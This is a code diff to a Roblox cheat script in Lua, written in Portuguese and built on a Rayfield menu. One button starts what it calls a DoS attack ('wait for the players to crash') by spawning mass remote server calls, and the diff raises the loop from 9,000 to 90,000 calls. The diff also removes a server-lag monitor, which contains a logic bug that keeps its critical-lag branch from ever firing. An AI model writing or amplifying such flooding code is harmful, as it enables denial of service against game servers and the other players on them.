@@ -701,7 +701,7 @@ MainTab:CreateButton({
             pcall(function() starterGui:SetCore("SendNotification", { Title = "Ataque DoS Iniciado", Text = "Aguarde os jogadores Crashar", Button1 = "Ok", Duration = 5 }) end)
 
             task.spawn(function()
-                for m = 1, 9000 do
+                for m = 1, 90000 do
                     task.spawn(function()
                         if toolRemote:IsA("RemoteFunction") then
                             toolRemote:InvokeServer("PickingTools", "FireHose")
@@ -755,58 +755,3 @@ MainTab:CreateButton({
         end,
     })
 end
-
--- Substitua MainTab pelo nome da sua aba ou crie uma nova apenas para Status
-local SectionStatus = MainTab:CreateSection("Monitoramento do Servidor & Lag")
-
--- 1. Cria as Labels definindo os parâmetros padrão (Texto, Ícone, Cor, IgnorarTema)
-local LabelIdade = MainTab:CreateLabel("Idade do Servidor: Calculando...", 4483362458, Color3.fromRGB(255, 255, 255), false)
-local LabelRestante = MainTab:CreateLabel("Tempo até Desligar: Calculando...", 4483362458, Color3.fromRGB(255, 255, 255), false)
-local LabelLag = MainTab:CreateLabel("Lag do Servidor: Calculando...", 4483362458, Color3.fromRGB(255, 255, 255), false)
-
--- Loop em segundo plano para monitorar o servidor a cada 1 segundo
-task.spawn(function()
-    while true do
-        local RunService = game:GetService("RunService")
-        
-        -- 2. CÁLCULO DE TEMPO (Limite padrão do Roblox de 20 horas)
-        local segundosRodando = time() 
-        local limiteRoblox = 20 * 3600 -- 20 horas em segundos
-        local segundosRestantes = math.max(0, limiteRoblox - segundosRodando)
-        
-        local function formatarTempo(totalSegundos)
-            local horas = math.floor(totalSegundos / 3600)
-            local minutes = math.floor((totalSegundos % 3600) / 60)
-            local segundos = math.floor(totalSegundos % 60)
-            return string.format("%02dh %02dm %02ds", horas, minutes, segundos)
-        end
-        
-        -- 3. CÁLCULO DE LAG DO SERVIDOR (Via frames de resposta física do Servidor)
-        local fpsServidor = math.floor(1 / RunService.Heartbeat:Wait())
-        
-        local statusLag = "Estavel"
-        local corLag = Color3.fromRGB(0, 255, 100) -- Verde (Estável)
-        
-        if fpsServidor < 45 then
-            statusLag = "Lag Leve (Servidor Pesado)"
-            corLag = Color3.fromRGB(255, 150, 0) -- Laranja
-        elseif fpsServidor < 25 then
-            statusLag = "LAG CRITICO (Ataque DoS ativo)"
-            corLag = Color3.fromRGB(255, 0, 0) -- Vermelho
-        end
-        
-        -- 4. CORREÇÃO DA RAYFIELD: Atualizando usando todos os parâmetros obrigatórios
-        LabelIdade:Set("Idade do Servidor: " .. formatarTempo(segundosRodando), 4483362458, Color3.fromRGB(255, 255, 255), false)
-        
-        if segundosRestantes > 0 then
-            LabelRestante:Set("Tempo ate Desligar: " .. formatarTempo(segundosRestantes), 4483362458, Color3.fromRGB(255, 255, 255), false)
-        else
-            LabelRestante:Set("Tempo ate Desligar: Iminente (Servidor Esgotado)", 4483362458, Color3.fromRGB(255, 0, 0), false)
-        end
-        
-        LabelLag:Set("Lag: " .. statusLag .. " | FPS-Servidor: " .. fpsServidor .. "/60", 4483362458, corLag, false)
-        
-        task.wait(1)
-    end
-end)
-
